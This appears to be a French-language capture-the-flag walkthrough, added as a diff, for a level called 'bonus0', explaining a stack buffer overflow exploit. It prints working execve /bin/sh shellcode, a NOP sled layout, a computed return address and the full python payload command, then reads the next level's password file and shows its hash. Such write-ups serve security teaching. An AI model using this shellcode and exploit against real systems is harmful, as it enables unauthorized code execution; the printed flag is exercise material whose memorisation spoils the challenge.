@@ -1,0 +1,47 @@
+BONUS 0
+-------
+
+1.	En analysant et en testant le programme on sait qu'il faut utiliser
+	le deuxième buffer pour réecrire l'EIP. L'offset est de 9. Donc on va
+	écrire 9 octets avant de mettre une valeur de retour. On va aussi ajouter
+	un nombre de caractères x > 10 à la fin pour être sûr que l'EIP ne soit
+	pas modifiée.
+
+2.	Pour ce niveau il n'y a pas de /bin/sh ou autre. Il va falloir
+	utiliser un shellcode.
+	Les 2 buffer dans la fonction pp() ne sont pas assez grand pour
+	accueillir un shellcode entier.
+	Nous allons donc injecter le shellcode dans le buffer de 4096,
+	en le précédent de NOP instruction et en le remplissant
+	de NOP instruction à la fin.
+
+3.	Donc on va remplir le premier buffer de 4096:
+	2067             +      SHELLCODE      +      2000       +     '\n'
+	NOP INSTRUCTION---------28 octets--------NOP INSTRUCTION-------1 octet
+
+	"\x90"*2067 + "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80" + "\x90"*2000 + "\x0a"
+
+4.	Maintenant que le premier buffer est rempli, nous allons trouver l'emplacement
+	du buffer pour que l'EIP soit l'adresse de notre shellcode.
+	Le buffer se trouve dans la fonction p()
+	br p
+	info frame
+	0xbffff680 ----> l'adresse de p()
+	On va additionner à cette adresse un nombre supérieur à ~2550 qui correspond
+	aux NOP instructions et autres.
+	Je vais utiliser 2650 qui donne 0xa5a en hexadécimal.
+	0xbffff680 + 0a5a = 0xbfffec26
+	9              +      EIP            +     30
+	CARACTERES-------\x26\xec\xff\xbf------CARACTERES
+	"B"*9 + "\x26\xec\xff\xbf" + "C"*30
+
+
+5.	Maintenant que nous avons les 2 buffer on peut les assembler.
+
+	python -c 'print "\x90"*2067+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"\x90"*2000+"\x0a"+"B"*9+"\x26\xec\xff\xbf"+"C"*30' > /tmp/b0
+	cat /tmp/b0 - | ./bonus0
+	cat /home/user/bonus1/.pass
+	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+8.	su bonus01
+	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
